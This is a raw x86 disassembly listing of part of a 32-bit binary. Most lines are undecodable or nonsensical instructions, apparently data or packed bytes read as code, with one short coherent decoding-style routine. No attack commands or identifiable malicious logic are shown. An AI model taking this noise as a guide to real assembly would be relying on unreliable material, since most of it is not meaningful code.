  403aea:	mov    BYTE PTR [ecx+0x263ca0fc],cl
  403af0:	dec    ebp
  403af1:	mov    ds:0x40f85f66,eax
  403af6:	cmp    al,0xf2
  403af8:	inc    ecx
  403af9:	rcr    BYTE PTR [eax+0x33],0xd1
  403afd:	and    eax,0xea1ae0ad
  403b02:	cmp    DWORD PTR gs:[eax+ebp*1+0x557db5bf],edi
  403b0a:	jns    0x403af6
  403b0c:	pop    ss
  403b0d:	mov    BYTE PTR [esi+0x1956de5f],0x52
  403b14:	or     eax,0x8d526a80
  403b19:	xor    al,0x3d
  403b1b:	dec    esi
  403b1c:	sub    BYTE PTR [eax+edi*4],bl
  403b1f:	lock lds esp,FWORD PTR [edx+eiz*8]
  403b23:	sub    al,0xcd
  403b25:	jns    0x403b7e
  403b27:	add    edx,esp
  403b29:	xchg   DWORD PTR [ecx+0x5ce89f7e],edx
  403b2f:	or     eax,DWORD PTR [eiz*1+0x2bffd98e]
  403b36:	(bad)  
  403b38:	jo     0x403b86
  403b3a:	call   0xd83c:0x419a5c3
  403b41:	sub    dh,bh
  403b43:	push   esp
  403b44:	fcmovne st,st(1)
  403b46:	pop    ebx
  403b47:	inc    ebp
  403b48:	ror    edx,1
  403b4a:	outs   dx,DWORD PTR ds:[esi]
  403b4b:	call   0x764:0xde1a68b2
  403b52:	mov    esi,0x7f375744
  403b57:	lock dec ecx
  403b59:	cdq    
  403b5a:	jnp    0x403baa
  403b5c:	outs   dx,BYTE PTR ds:[esi]
  403b5d:	ror    BYTE PTR [ebx-0x9],cl
  403b60:	scas   eax,DWORD PTR es:[edi]
  403b61:	iret   
  403b62:	mov    ecx,0xb33bcac2
  403b67:	ins    DWORD PTR es:[edi],dx
  403b68:	push   esp
  403b69:	xor    DWORD PTR [ebx],0x33
  403b6c:	cmp    bh,BYTE PTR [esi]
  403b6e:	enter  0xa2db,0x1
  403b72:	es iret 
  403b74:	ret    0xde18
  403b77:	add    ebx,DWORD PTR [eax+0x26381414]
  403b7d:	push   DWORD PTR [edi+0x3d]
  403b80:	xchg   edi,eax
  403b81:	cs in  eax,dx
  403b83:	imul   ebx
  403b85:	sbb    DWORD PTR [eax-0x2d],esp
  403b88:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  403b8a:	add    bl,BYTE PTR [edi]
  403b8c:	stos   BYTE PTR es:[edi],al
  403b8d:	test   BYTE PTR [edx-0x17],ch
  403b90:	mov    al,ds:0x9885ee5a
  403b95:	out    dx,al
  403b96:	loope  0x403c12
  403b98:	and    ch,BYTE PTR ds:0x99fe9af1
  403b9e:	sub    al,0xb
  403ba0:	push   ds
  403ba1:	repz xchg ecx,eax
  403ba3:	xor    BYTE PTR [ecx+0x349c47a7],0x60
  403baa:	mov    esi,0x7776e548
  403baf:	mov    ch,0x49
  403bb1:	lds    ecx,FWORD PTR [ebp+0x16648b26]
  403bb7:	sti    
  403bb8:	pop    ecx
  403bb9:	shl    DWORD PTR [esi-0x12],1
  403bbc:	push   ds
  403bbd:	mov    ebp,gs
  403bbf:	jb     0x403bc5
  403bc1:	sbb    BYTE PTR [ebx],ah
  403bc3:	lods   eax,DWORD PTR ds:[esi]
  403bc4:	aam    0x96
  403bc6:	ror    BYTE PTR [edi],cl
  403bc8:	jbe    0x403c09
  403bca:	cmp    edx,0x22364ff3
  403bd0:	jge    0x403b7d
  403bd2:	scas   al,BYTE PTR es:[edi]
  403bd3:	int    0xc1
  403bd5:	or     eax,0x1f774c2f
  403bda:	xchg   DWORD PTR [edi],ebx
  403bdc:	mov    cl,0x90
  403bde:	ja     0x403c18
  403be0:	adc    eax,ecx
  403be2:	aas    
  403be3:	dec    ecx
  403be4:	mov    ebx,0xee3a8645
  403be9:	std    
  403bea:	adc    DWORD PTR [eax],edx
  403bec:	stos   DWORD PTR es:[edi],eax
  403bed:	test   DWORD PTR [edx],edx
  403bef:	mov    esi,0xf70f12f4
  403bf4:	pop    ebx
  403bf5:	inc    esp
  403bf6:	jecxz  0x403bed
  403bf8:	es in  al,0x64
  403bfb:	push   esp
  403bfc:	retf   
  403bfd:	outs   dx,DWORD PTR ds:[esi]
  403bfe:	rol    DWORD PTR [esi],1
  403c00:	inc    edx
  403c01:	pop    ss
  403c02:	xlat   BYTE PTR ds:[ebx]
  403c03:	jmp    0xd6515505
  403c08:	jnp    0x403c78
  403c0a:	inc    esp
  403c0b:	adc    al,0x28
  403c0d:	cdq    
  403c0e:	mov    ch,0x1e
  403c10:	pop    edx
  403c11:	das    
  403c12:	sbb    BYTE PTR [esi-0x181ee18e],dl
  403c18:	mov    al,ds:0x21435371
  403c1d:	das    
  403c1e:	loop   0x403c4a
  403c20:	stos   DWORD PTR es:[edi],eax
  403c21:	ficom  DWORD PTR [edx]
  403c23:	sub    edx,DWORD PTR [eax+0x46]
  403c26:	adc    DWORD PTR ds:0x58d303db,esp
  403c2c:	xchg   ecx,eax
  403c2d:	iret   
  403c2e:	or     ebp,ebx
  403c30:	ret    
  403c31:	ds xchg ebx,eax
  403c33:	clc    
  403c34:	shr    BYTE PTR [ecx-0x79],0x4
  403c38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c39:	lods   al,BYTE PTR ds:[esi]
  403c3a:	dec    edi
  403c3b:	mov    eax,0x3ab3408c
  403c40:	pusha  
  403c41:	cmp    al,0x65
  403c43:	shl    DWORD PTR [ecx],0xe4
  403c46:	mov    esi,0x741fb9b4
  403c4b:	mov    dh,0x60
  403c4d:	pop    esp
  403c4e:	and    eax,0xef6208ff
  403c53:	jge    0x403c3f
  403c55:	and    al,0x94
  403c57:	adc    bl,BYTE PTR [eax]
  403c59:	repz rcl BYTE PTR [ebp+eiz*8+0x20e2574f],cl
  403c61:	cs in  al,0x76
  403c64:	dec    ebp
  403c65:	mov    bh,0x58
  403c67:	mov    ebx,0xaa90ad24
  403c6c:	or     al,0x6d
  403c6e:	sbb    esi,DWORD PTR [edx+0x7de0cc5]
  403c74:	inc    esi
  403c75:	les    eax,FWORD PTR [ebp+0x2da8ef9b]
  403c7b:	xchg   DWORD PTR ds:0x1dfac3a7,ebx
  403c81:	jo     0x403c4c
  403c83:	xor    cl,BYTE PTR [edi-0x34864603]
  403c89:	cmp    bl,BYTE PTR [esi]
  403c8b:	ds push edx
  403c8d:	rcl    DWORD PTR [edx-0x4979e34c],cl
  403c93:	mov    al,0xfc
  403c95:	(bad)  
  403c96:	js     0x403cdf
  403c98:	pop    esi
  403c99:	or     DWORD PTR [edx+0x37],ebp
  403c9c:	shl    DWORD PTR [ebx+edx*4-0x7e],1
  403ca0:	inc    esi
  403ca1:	or     cl,dl
  403ca3:	sahf   
  403ca4:	push   ss
  403ca5:	aad    0xf0
  403ca7:	jno    0x403d25
  403ca9:	mov    bh,0x3a
  403cab:	lea    edi,[esi+esi*2]
  403cae:	pop    eax
  403caf:	mov    bl,0x31
  403cb1:	dec    ecx
  403cb2:	jmp    0x403cdf
  403cb4:	xchg   ecx,eax
  403cb5:	imul   eax,DWORD PTR [esi+0x70],0x6c4e79ea
  403cbc:	mov    bh,0xab
  403cbe:	fisub  WORD PTR [ebp+0x76]
  403cc1:	lds    ecx,FWORD PTR [edi+ebx*8+0x340c9691]
  403cc8:	ror    DWORD PTR [ebx*2-0x23fd33b5],1
  403ccf:	lods   eax,DWORD PTR ds:[esi]
  403cd0:	adc    ecx,DWORD PTR [edi]
  403cd2:	out    dx,eax
  403cd3:	push   ebp
  403cd4:	push   eax
  403cd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403cd6:	repz sbb edi,DWORD PTR [ecx+0x30fd9f01]
  403cdd:	sub    ch,ch
  403cdf:	hlt    
  403ce0:	pop    eax
  403ce1:	pop    ecx
  403ce2:	jecxz  0x403c91
  403ce4:	mov    bl,0x39
  403ce6:	push   esi
  403ce7:	sbb    DWORD PTR [edi],0x70083abf
  403ced:	ds mov ebp,0x841a9e2
  403cf3:	and    eax,0x3dd1e1c
  403cf8:	mov    edi,0x57ab802
  403cfd:	mov    esp,0xfe3478e6
  403d02:	ret    0xcf6
  403d05:	dec    ebx
  403d06:	adc    cl,BYTE PTR ds:0x1b7bf48b
  403d0c:	ficomp DWORD PTR [ebx-0xded8b54]
  403d12:	pop    edx
  403d13:	mov    edx,0x6109dbc0
  403d18:	stos   BYTE PTR es:[edi],al
  403d19:	jle    0x403d57
  403d1b:	inc    edx
  403d1c:	jmp    0xf6e625b1
  403d21:	inc    esi
  403d22:	pop    edi
  403d23:	cmp    BYTE PTR [esi],bh
  403d25:	ds xor al,0x1d
  403d28:	sti    
  403d29:	int    0xea
  403d2b:	push   edx
  403d2c:	repz push ebp
  403d2e:	(bad)  
  403d2f:	sub    eax,0x62c73604
  403d34:	mov    cl,0xf8
  403d36:	mov    bl,0x7e
  403d38:	jp     0x403da5
  403d3a:	dec    ecx
  403d3b:	imul   ecx,DWORD PTR ds:0xf98d7f95,0x3576e6a
  403d45:	mov    ds,WORD PTR [esi]
  403d47:	addr16 inc ecx
  403d49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d4a:	xor    al,0x6a
  403d4c:	nop
  403d4d:	mov    al,0x1d
  403d4f:	aad    0x58
  403d51:	cld    
  403d52:	test   BYTE PTR [ebx-0x59],cl
  403d55:	test   BYTE PTR [edi+ecx*8+0x47],bh
  403d59:	pop    edi
  403d5a:	retf   0x5942
  403d5d:	rep stos DWORD PTR es:[edi],eax
  403d5f:	pop    ebp
  403d60:	enter  0xe60a,0x99
  403d64:	cs retf 
  403d66:	popf   
  403d67:	lods   eax,DWORD PTR ds:[esi]
  403d68:	test   al,0x9a
  403d6a:	add    esp,DWORD PTR [edi]
  403d6c:	lods   eax,DWORD PTR ds:[esi]
  403d6d:	sub    ecx,DWORD PTR [ecx-0x3c]
  403d70:	mov    ds:0xe11fe9c5,eax
  403d75:	dec    ebx
  403d76:	ror    BYTE PTR [edi],cl
  403d78:	shl    DWORD PTR [ebx-0x69a2737b],0x5c
  403d7f:	fldl2e 
  403d81:	mov    eax,ds:0x8631507d
  403d86:	and    DWORD PTR ds:0x4318fc59,0xffffff90
  403d8d:	lods   eax,DWORD PTR ds:[esi]
  403d8e:	test   al,0x9b
  403d90:	icebp  
  403d91:	pop    ds
  403d92:	scas   eax,DWORD PTR es:[edi]
  403d93:	mov    al,0xc0
  403d95:	mov    ebp,0x9019b988
  403d9a:	push   ebp
  403d9b:	jge    0x403da6
  403d9d:	dec    ebp
  403d9e:	in     al,0x28
  403da0:	jp     0x403e10
  403da2:	sbb    BYTE PTR fs:[esi-0x1d],ah
  403da6:	inc    ebp
  403da7:	jns    0x403dc6
  403da9:	pushf  
  403daa:	dec    edi
  403dab:	mov    BYTE PTR [edx-0x3b613fbb],ah
  403db1:	xchg   ebx,eax
  403db2:	xchg   ebp,eax
  403db3:	add    BYTE PTR [eax+0x46226a60],0x37
  403dba:	or     eax,DWORD PTR [ebx+0x2bf05d8b]
  403dc0:	fistp  QWORD PTR [ebx]
  403dc2:	fimul  DWORD PTR [edi]
  403dc4:	xchg   DWORD PTR [eax],ecx
  403dc6:	add    BYTE PTR [eax],al
  403dc8:	add    BYTE PTR [ebx-0x5a1627ab],cl
  403dce:	add    eax,DWORD PTR [eax]
  403dd0:	add    BYTE PTR [ebx+0x7d8bd055],cl
  403dd6:	cld    
  403dd7:	xor    edx,eax
  403dd9:	xor    edi,eax
  403ddb:	add    edi,ecx
  403ddd:	add    edx,ecx
  403ddf:	imul   edx,edi
  403de2:	mov    edi,DWORD PTR [ebp-0x8]
  403de5:	mov    ebx,DWORD PTR [ebp-0x10]
  403de8:	sub    ebx,edi
  403dea:	cmp    ebx,edx
  403dec:	ja     0x403dfa
  403df2:	mov    edx,DWORD PTR [ebp-0x2c]
  403df5:	jmp    0x404176
  403dfa:	mov    edx,DWORD PTR [ebp-0x34]
  403dfd:	mov    edi,DWORD PTR [ebp-0x4]
  403e00:	xor    edx,eax
  403e02:	xor    edi,eax
  403e04:	add    edi,ecx
  403e06:	add    edx,ecx
  403e08:	imul   edx,edi
  403e0b:	mov    edi,DWORD PTR [ebp-0x8]
  403e0e:	mov    ebx,DWORD PTR [ebp-0x10]
  403e11:	sub    ebx,edi
  403e13:	cmp    ebx,edx
  403e15:	ja     0x403e23
  403e1b:	mov    edx,DWORD PTR [ebp-0x30]
  403e1e:	jmp    0x404176
  403e23:	mov    edx,DWORD PTR [ebp-0x38]
  403e26:	mov    edi,DWORD PTR [ebp-0x4]
  403e29:	xor    edx,eax
  403e2b:	xor    edi,eax
  403e2d:	add    edi,ecx
  403e2f:	add    edx,ecx
  403e31:	imul   edx,edi
  403e34:	mov    edi,DWORD PTR [ebp-0x8]
  403e37:	mov    ebx,DWORD PTR [ebp-0x10]
  403e3a:	sub    ebx,edi
  403e3c:	cmp    ebx,edx
  403e3e:	ja     0x403e4c
  403e44:	mov    edx,DWORD PTR [ebp-0x34]
  403e47:	jmp    0x404176
  403e4c:	mov    edx,DWORD PTR [ebp-0x3c]
  403e4f:	mov    edi,DWORD PTR [ebp-0x4]
  403e52:	xor    edx,eax
  403e54:	xor    edi,eax
  403e56:	add    edx,ecx
  403e58:	add    edi,ecx
  403e5a:	imul   edx,edi
  403e5d:	mov    edi,DWORD PTR [ebp-0x8]
  403e60:	mov    ebx,DWORD PTR [ebp-0x10]
  403e63:	jmp    0x404166
  403e68:	mov    dh,0x45
  403e6a:	xchg   edi,eax
  403e6b:	xor    BYTE PTR [ebp+0x50],0xb1
  403e6f:	jno    0x403e18
  403e71:	(bad)  
  403e72:	cs push 0xfffffff0
  403e75:	jecxz  0x403ea4
  403e77:	cmp    cl,BYTE PTR [edx]
  403e79:	pop    ds
  403e7a:	jle    0x403efa
  403e7c:	pop    eax
  403e7d:	jl     0x403efd
  403e7f:	jle    0x403e94
  403e81:	push   esp
  403e82:	jne    0x403e57
  403e84:	stc    
  403e85:	pop    edi
  403e86:	or     al,BYTE PTR [eax]
  403e88:	test   eax,0x56ec4315
  403e8d:	sbb    BYTE PTR ds:0xa8c34950,dh
  403e93:	inc    BYTE PTR [edx+0x5c290c6f]
  403e99:	xchg   edi,eax
  403e9a:	mov    DWORD PTR [edx-0x1a],0x395bef35
  403ea1:	sub    edi,ebx
  403ea3:	mov    WORD PTR [esi+0x7138ef98],cs
  403ea9:	xchg   DWORD PTR [esi+ebx*8],esp
  403eac:	mul    BYTE PTR [ecx]
  403eae:	(bad)  
  403eaf:	push   esi
  403eb0:	xchg   edx,eax
  403eb1:	fimul  WORD PTR [esi+edi*8-0x79ff55e6]
  403eb8:	adc    al,dh
  403eba:	mov    dl,0x20
  403ebc:	xchg   edx,eax
  403ebd:	enter  0xc941,0xc3
  403ec1:	pop    edi
  403ec2:	mov    edi,0x1bc63a0f
  403ec7:	add    eax,0xef7f5e89
  403ecc:	jo     0x403e98
  403ece:	and    BYTE PTR ds:0x50d2d636,0xe5
  403ed5:	fbld   TBYTE PTR [esi]
  403ed7:	shl    DWORD PTR [ebx],0xb6
  403eda:	cwde   
  403edb:	popa   
  403edc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403edd:	ins    BYTE PTR es:[edi],dx
  403ede:	xchg   ebp,eax
  403edf:	sbb    DWORD PTR [ecx+esi*4],ebp
  403ee2:	pop    esp
  403ee3:	push   edx
  403ee4:	add    ah,BYTE PTR [ecx-0x3be917fb]
  403eea:	les    edx,FWORD PTR [ecx]
  403eec:	sub    al,0xa9
  403eee:	xlat   BYTE PTR ds:[ebx]
  403eef:	add    edi,ebp
  403ef1:	and    ebp,ecx
  403ef3:	out    dx,al
  403ef4:	mov    edx,DWORD PTR [edi]
  403ef6:	mov    esi,0x6343a0f9
  403efb:	outs   dx,DWORD PTR ds:[esi]
  403efc:	mov    cs,WORD PTR [eax+edx*1]
  403eff:	aas    
  403f00:	pop    edx
  403f01:	add    eax,0xc086a4e
  403f06:	cmp    eax,0x7a4d5be4
  403f0b:	mov    al,ds:0x4d5b98ae
  403f10:	xchg   ecx,eax
  403f11:	pushf  
  403f12:	push   0x2
  403f14:	loopne 0x403eec
  403f16:	jo     0x403f06
  403f18:	push   cs
  403f19:	push   edi
  403f1a:	test   eax,0xfeb5999e
  403f1f:	jp     0x403f22
  403f21:	shl    DWORD PTR [esi-0x29a8256f],1
  403f27:	jbe    0x403f29
  403f29:	xlat   BYTE PTR es:[ebx]
  403f2b:	retw   0xa8d5
  403f2f:	jmp    0x57644eeb
  403f34:	adc    DWORD PTR [eax],esi
  403f36:	out    0xa1,eax
  403f38:	jmp    0x403f60
  403f3a:	pop    esp
  403f3b:	ins    DWORD PTR es:[edi],dx
  403f3c:	mov    dl,0xbc
  403f3e:	nop
  403f3f:	cmp    DWORD PTR [ebx+ecx*2],esi
  403f42:	push   ebp
  403f43:	pop    ds
  403f44:	outs   dx,DWORD PTR ds:[esi]
  403f45:	and    eax,0xde250c42
  403f4a:	cmc    
  403f4b:	add    DWORD PTR ds:0x5b760186,esp
  403f51:	popf   
  403f52:	jae    0x403f01
  403f54:	fild   QWORD PTR [ecx-0x10]
  403f57:	cmp    eax,0xc58628d5
  403f5c:	xor    ah,cl
  403f5e:	and    al,BYTE PTR [edi]
  403f60:	mov    ecx,0x6bede260
  403f65:	bnd jbe 0x403f53
  403f68:	rol    DWORD PTR [esi+ebp*2+0xc76d696],cl
  403f6f:	test   BYTE PTR [eax],al
  403f71:	pop    esp
  403f72:	fldenv [eax]
  403f74:	shl    DWORD PTR gs:[ecx+esi*4-0x4861a504],1
  403f7c:	mov    eax,ds:0xf01bf1bf
  403f81:	retf   
  403f82:	out    dx,al
  403f83:	rcr    eax,0xc9
  403f86:	dec    edx
  403f87:	and    bx,WORD PTR [esi+0x5b]
  403f8b:	out    dx,al
  403f8c:	mov    al,ds:0xd458d605
  403f91:	popf   
  403f92:	sbb    eax,0xc736fa91
  403f97:	repz mov ebp,0x877b4057
  403f9d:	cli    
  403f9e:	cmp    esp,eax
  403fa0:	idiv   ah
  403fa2:	icebp  
  403fa3:	or     eax,0x7d6ec5de
  403fa8:	adc    eax,0x3ec04a04
  403fad:	test   eax,0x100d4f8b
  403fb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fb3:	ss es pop ebx
  403fb6:	(bad)  
  403fb8:	push   edx
  403fb9:	mov    edi,0xe891c3c0
  403fbe:	or     ebx,ebp
  403fc0:	add    eax,DWORD PTR [edi]
  403fc2:	fnstenv [edx-0x60]
  403fc5:	lods   al,BYTE PTR ds:[esi]
  403fc6:	call   0x933273f7
  403fcb:	xchg   edi,eax
  403fcc:	lods   al,BYTE PTR ds:[esi]
  403fcd:	or     al,0x6f
  403fcf:	stos   BYTE PTR es:[edi],al
  403fd0:	(bad)
  403fd3:	(bad)  [ebp+ecx*1-0x79]
  403fd7:	mov    edi,0x682f4efe
  403fdc:	xor    eax,0xe4ed170c
  403fe1:	mov    eax,0xf50e8b0c
  403fe6:	dec    eax
  403fe7:	stos   DWORD PTR es:[edi],eax
  403fe8:	pop    ecx
  403fe9:	xor    eax,0xb73d8808
  403fee:	or     DWORD PTR [ebp+0x5a26a4c2],0xffffff9d
  403ff5:	mov    esp,0xc52ff863
  403ffa:	ret    0x252e
  403ffd:	cmc    
  403ffe:	int3   
  403fff:	inc    eax
  404000:	imul   esp,DWORD PTR [ebx],0x4f307efb
  404006:	imul   ebp,DWORD PTR [ecx],0xe7e84bed
  40400c:	cmp    DWORD PTR [ecx-0x2927ec3f],ebx
  404012:	xchg   BYTE PTR [ebx],ch
  404014:	ds cld 
  404016:	outs   dx,BYTE PTR ds:[esi]
  404017:	ins    DWORD PTR es:[edi],dx
  404018:	push   esp
  404019:	je     0x404011
  40401b:	pop    eax
  40401c:	shl    DWORD PTR [ebp+0x64],1
  40401f:	shl    DWORD PTR [esi+0x1b],cl
  404022:	test   eax,0x60f86e93
  404027:	fist   WORD PTR [ebx-0x52b965fa]
  40402d:	int    0x87
  40402f:	pop    ds
  404030:	leave  
  404031:	jge    0x403fc3
  404033:	inc    edi
  404034:	xor    ebp,DWORD PTR [esp+ebp*4]
  404037:	add    bh,BYTE PTR [edi-0x501b445c]
  40403d:	mov    dl,0x5a
  40403f:	data16 (bad) 
  404041:	and    eax,0x553ce72
  404046:	push   ss
  404047:	lods   eax,DWORD PTR ds:[esi]
  404048:	test   DWORD PTR [edi+0x279b8a0c],edx
  40404e:	repz clc 
  404050:	rcr    BYTE PTR [edx],0xb4
  404053:	inc    eax
  404054:	or     eax,ebp
  404056:	mov    ds:0xe00b4e79,al
  40405b:	dec    ebp
  40405c:	outs   dx,DWORD PTR ds:[esi]
  40405d:	test   al,ah
  40405f:	mov    ?,eax
  404061:	pop    ebx
  404062:	sahf   
  404063:	add    dl,bh
  404065:	pop    ecx
  404066:	mov    bl,BYTE PTR ds:0x304d042a
  40406c:	cmc    
  40406d:	inc    esp
  40406e:	cs mov ds:0x941d09f5,al
  404075:	fdiv   QWORD PTR [esi+eax*4-0x3d]
  404079:	cmc    
  40407a:	push   0x72
  40407c:	xor    eax,0x13ce00c3
  404081:	sub    BYTE PTR [eax-0x34],0xdf
  404085:	ins    BYTE PTR es:[edi],dx
  404086:	xchg   esi,eax
  404087:	cmc    
  404088:	iret   
  404089:	(bad)  
  40408a:	clc    
  40408b:	mov    edi,0x566bda10
  404090:	cmp    BYTE PTR [ebp+0x5d],ch
  404093:	mov    esp,DWORD PTR [edi]
  404095:	(bad)  
  404096:	pop    ds
  404097:	jge    0x40406e
  404099:	mov    cs,WORD PTR [ecx]
  40409b:	ds push cs
  40409d:	dec    ecx
  40409e:	fisubr DWORD PTR [esi+0xa51e8c6]
  4040a4:	mov    dl,0xc7
  4040a6:	in     eax,dx
  4040a7:	lock xchg DWORD PTR [esi+0x4],edi
  4040ab:	test   al,0x32
  4040ad:	xchg   BYTE PTR [esi],ch
  4040af:	jno    0x404091
  4040b1:	rcr    BYTE PTR [edi+eax*1-0x58ef65c6],0x2d
  4040b9:	iret   
  4040ba:	mov    eax,DWORD PTR [ecx-0x5e]
  4040bd:	pop    ebx
  4040be:	js     0x4040b0
  4040c0:	outs   dx,DWORD PTR ds:[esi]
  4040c1:	push   0x7375a910
  4040c6:	mov    bl,0x51
  4040c8:	imul   esi,DWORD PTR [eax+esi*1+0x7f],0xc8a44a5c
  4040d0:	mov    dl,0x44
  4040d2:	mov    dh,0x7e
  4040d4:	jl     0x40405a
  4040d6:	mov    ah,0x3
  4040d8:	sub    ah,al
  4040da:	popf   
  4040db:	pop    esp
  4040dc:	mov    al,ds:0xa85c280b
  4040e1:	xchg   ebp,eax
  4040e2:	aaa    
  4040e3:	out    0xa7,al
  4040e5:	push   ecx
  4040e6:	cmp    eax,DWORD PTR [eax+esi*1+0x779c7421]
  4040ed:	xchg   edi,eax
  4040ee:	or     eax,0x3a081ff4
  4040f3:	ins    DWORD PTR es:[edi],dx
  4040f4:	mov    ebx,0x198c51c7
  4040f9:	adc    bl,bl
  4040fb:	outs   dx,DWORD PTR ds:[esi]
  4040fc:	pop    ss
  4040fd:	and    al,0x76
  4040ff:	pusha  
  404100:	add    eax,0xbe670cc6
  404105:	inc    esp
  404106:	push   esp
  404107:	jb     0x4040fa
  404109:	loope  0x40416f
  40410b:	es add esp,ebp
  40410e:	add    al,0xfc
  404110:	push   es
  404111:	in     al,0xdf
  404113:	aam    0xa3
  404115:	aam    0x75
  404117:	jmp    0xefe6c4fb
  40411c:	mov    al,0xc1
  40411e:	jo     0x4040aa
  404120:	inc    edx
  404121:	cs into 
  404123:	(bad)  
  404124:	push   cs
  404125:	and    al,0x97
  404127:	dec    eax
  404128:	sbb    bh,ch
  40412a:	pop    ebx
  40412b:	rol    DWORD PTR [ebp+0x2d],0x2d
  40412f:	iret   
  404130:	sar    DWORD PTR [edx-0x24799e72],1
  404136:	jecxz  0x40412a
  404138:	xchg   edx,eax
  404139:	cmc    
  40413a:	je     0x4041b0
  40413c:	cmc    
  40413d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40413e:	sbb    eax,0x81ae0cd9
  404143:	cli    
  404144:	(bad)  
  404145:	lods   eax,DWORD PTR ds:[esi]
  404146:	imul   edi,DWORD PTR [edx-0xe],0x901648ca
  40414d:	add    eax,DWORD PTR [esp+esi*2+0x70]
  404151:	push   esp
  404152:	mov    esp,0x8b245cd
  404157:	mov    WORD PTR [eax-0x751099ce],gs
  40415d:	mov    edx,DWORD PTR ds:0x28078df4
  404163:	push   ss
  404164:	jle    0x404121
  404166:	sub    ebx,edi
  404168:	cmp    ebx,edx
  40416a:	mov    edx,DWORD PTR [ebp-0x38]
  40416d:	jbe    0x404176
  404173:	mov    edx,DWORD PTR [ebp-0x3c]
  404176:	mov    edi,DWORD PTR [ebp-0x4]
  404179:	jmp    0x40447c
  40417e:	mov    al,0x3b
  404180:	aaa    
  404181:	or     BYTE PTR [ebp-0x10],dh
  404184:	mov    cl,0x63
  404186:	sub    DWORD PTR [edi],0xffffffd4
  404189:	xor    BYTE PTR [eax],bl
  40418b:	or     eax,0x1d74709e
  404190:	jle    0x404210
  404192:	pop    eax
  404193:	jl     0x404213
  404195:	jle    0x4041c1
  404197:	jo     0x4041f1
  404199:	je     0x4041eb
  40419b:	jmp    0x40416b
  40419d:	paddq  mm0,QWORD PTR [esi-0x22]
  4041a1:	sbb    ebp,ebx
  4041a3:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4041a5:	icebp  
  4041a6:	jl     0x404179
  4041a8:	outs   dx,DWORD PTR ds:[esi]
  4041a9:	pop    eax
  4041aa:	and    esi,DWORD PTR [esi+0x7a4c836]
  4041b0:	lahf   
  4041b1:	mov    ecx,0x2faad54c
  4041b6:	stos   DWORD PTR es:[edi],eax
  4041b7:	hlt    
  4041b8:	sti    
  4041b9:	popf   
  4041ba:	sub    edi,DWORD PTR [edi]
  4041bc:	jmp    0x3f0f5dd4
  4041c1:	mov    ds:0x2caa9fee,eax
  4041c6:	jl     0x404205
  4041c8:	stos   DWORD PTR es:[edi],eax
  4041c9:	sub    DWORD PTR [eax],esp
  4041cb:	mov    di,0x8e7c
  4041cf:	jne    0x404160
  4041d1:	push   edx
  4041d2:	dec    edi
  4041d3:	adc    DWORD PTR [eax-0x50],ebx
  4041d6:	imul   esi,DWORD PTR [ecx+0x7a],0xffffffc6
  4041da:	push   edx
  4041db:	mov    ebx,DWORD PTR [edx]
  4041dd:	dec    ebp
  4041de:	jno    0x404169
  4041e0:	leave  
  4041e1:	jb     0x404166
  4041e3:	loopne 0x40418c
  4041e5:	or     BYTE PTR [ecx],cl
  4041e7:	and    al,0x0
  4041e9:	inc    edi
  4041ea:	lahf   
  4041eb:	addr16 pop edx
  4041ed:	adc    eax,0x12e0c2e3
  4041f2:	(bad)  
  4041f3:	dec    esi
  4041f4:	test   esi,ebp
  4041f6:	loope  0x404193
  4041f8:	enter  0xdb47,0x27
  4041fc:	xchg   esp,eax
  4041fd:	jnp    0x404220
  4041ff:	push   ss
  404200:	xor    BYTE PTR gs:[esi+0x1],al
  404204:	mov    dh,0xcc
  404206:	call   0xd44bd10f
  40420b:	jbe    0x4041d5
  40420d:	sub    BYTE PTR [esi],ah
  40420f:	addr16 jae 0x404197
  404212:	cmp    edi,0x4d99ca07
  404218:	mov    ecx,0x8a2ff551
  40421d:	mov    ch,0x2
  40421f:	adc    esp,eax
  404221:	test   eax,0x65559e30
  404226:	jno    0x4041b6
  404228:	mov    bh,0x65
  40422a:	out    dx,eax
  40422b:	push   eax
  40422c:	pop    edx
  40422d:	pushw  cs
  40422f:	mov    BYTE PTR [edi],ch
  404231:	push   ecx
  404232:	pop    ebx
  404233:	mov    cl,0x9d
  404235:	out    dx,eax
  404236:	mov    eax,ds:0xd1b9a340
  40423b:	imul   ebx,DWORD PTR [edi+0x2e],0x45
  40423f:	aad    0xa3
  404241:	mov    esi,ebp
  404243:	call   0x110d:0xc4a204ae
  40424a:	rcr    BYTE PTR [ebx+esi*2],cl
  40424d:	jb     0x404246
  40424f:	adc    al,0xa
  404251:	aaa    
  404252:	scas   eax,DWORD PTR es:[edi]
  404253:	inc    eax
  404254:	xchg   ebx,eax
  404255:	or     bh,ch
  404257:	(bad)  
  404258:	outs   dx,DWORD PTR ds:[esi]
  404259:	adc    edi,DWORD PTR [edx+0x52]
  40425c:	in     al,dx
  40425d:	imul   eax,DWORD PTR [ecx+0x35],0x6d21f62e
  404264:	jl     0x4041f5
  404266:	and    al,0x94
  404268:	mov    bh,0x23
  40426a:	ds mov dh,0x5a
  40426d:	jb     0x40424b
  40426f:	mov    edi,ecx
  404271:	or     DWORD PTR [ecx-0x24b29610],ebp
  404277:	add    BYTE PTR [edx-0xb17ca61],ch
  40427d:	mov    ch,0xcd
  40427f:	sbb    eax,0x9998771
  404284:	rol    BYTE PTR [eax-0x27],1
  404287:	cmp    esp,edi
  404289:	test   BYTE PTR [ecx+eiz*1],dl
  40428c:	pop    eax
  40428d:	sub    esp,DWORD PTR [ebp-0xdb2ab8e]
  404293:	mov    al,0xf6
  404295:	addr16 out 0x55,eax
  404298:	push   ebx
  404299:	or     BYTE PTR ds:0x15841a0,dl
  40429f:	mov    dl,0xfd
  4042a1:	dec    eax
  4042a2:	cwde   
  4042a3:	cwde   
  4042a4:	mov    ds:0x8a20c07c,eax
  4042a9:	sbb    DWORD PTR [ecx-0x388596ab],0x27
  4042b0:	ret    0x7811
  4042b3:	repz hlt 
  4042b5:	das    
  4042b6:	icebp  
  4042b7:	inc    ecx
  4042b8:	in     eax,dx
  4042b9:	js     0x4042c7
  4042bb:	je     0x4042bc
  4042bd:	ins    DWORD PTR es:[edi],dx
  4042be:	setp   BYTE PTR [eax]
